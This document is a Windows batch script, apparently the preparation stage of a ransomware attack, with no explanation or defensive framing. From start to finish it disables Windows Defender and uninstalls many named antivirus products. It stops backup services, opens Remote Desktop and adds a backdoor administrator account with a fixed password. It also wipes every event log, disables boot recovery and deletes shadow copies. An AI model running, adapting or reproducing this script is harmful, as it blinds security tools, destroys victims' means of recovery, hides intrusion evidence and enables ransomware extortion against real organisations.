@echo off
cmd.exe /c assoc .ransom=txtfile
reg.exe delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v MpEnablePus /t REG_DWORD /d 0 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SpynetReporting /t REG_DWORD /d 0 /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f

reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
reg.exe delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg.exe delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg.exe delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
reg.exe add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f

schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable

start wmic product where name="Avast Premium Security" call uninstall /nointeractive
start wmic product where name="Avast Free Antivirus" call uninstall /nointeractive
start wmic product where name="Avast Endpoint Protection" call uninstall /nointeractive
start wmic product where name="AVG Antivirus Free" call uninstall /nointeractive
start wmic product where name="AVG 2021" call uninstall /nointeractive
start wmic product where name="BitDefender Antivirus Plus" call uninstall /nointeractive
start wmic product where name="BitDefender Total Security" call uninstall /nointeractive
start wmic product where name="ESET File Security" call uninstall /nointeractive
start wmic product where name="ESET Endpoint Antivirus" call uninstall /nointeractive
start wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive
start wmic product where name="McAfee Agent" call uninstall /nointeractive
start wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive
start wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Threat Prevention" call uninstall /nointeractive
start wmic product where name="Microsoft Security Client" call uninstall /nointeractive
start wmic product where name="Malwarebytes' Managed Client" call uninstall /nointeractive
start wmic product where name="Sophos System Protection" call uninstall /nointeractive
start wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive
start wmic product where name="Sophos Remote Management System" call uninstall /nointeractive
start wmic product where name="Symantec Endpoint Protection" call uninstall /nointeractive
start wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
start wmic product where name="Panda WatchGuard Endpoint Security" call uninstall /nointeractive
start wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet

net  stop "Zoolz 2 Service" /y
net  stop "Veeam Backup Catalog Data Service" /y
net  stop "Symantec System Recovery" /y
net  stop "SQLsafe Filter Service" /y
net  stop "SQLsafe Backup Service" /y
net  stop "SQL Backups" /y
net  stop "Acronis VSS Provider" /y
net  stop VeeamDeploySvc /y
net  stop BackupExecVSSProvider /y
net  stop BackupExecRPCService /y
net  stop BackupExecManagementService /y
net  stop BackupExecJobEngine /y
net  stop BackupExecDeviceMediaService /y

cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
cmd.exe /C netsh firewall set service type = remotedesktop mode = enable
cmd.exe /C netsh firewall set rule group="remote desktop" new enable=Yes
cmd.exe /C netsh advfirewall set rule group="remote desktop" new enable=Yes
cmd.exe /C net user Neo P@ssword123!
cmd.exe /C net localgroup Administrators Neo

powershell.exe -Command "Uninstall-WindowsFeature -Name Windows-Defender;Add-MpPreference -ExclusionExtension ".exe";wevtutil el | Foreach-Object {wevtutil cl "$_"}"
sc  config "Netbackup Legacy Network service" start= disabled
bcdedit  /set {default}
bcdedit  /set {default} recoveryenabled No
vssadmin delete shadows /all /quiet
wmic.exe  Shadowcopy Delete
wbadmin stop job -quiet
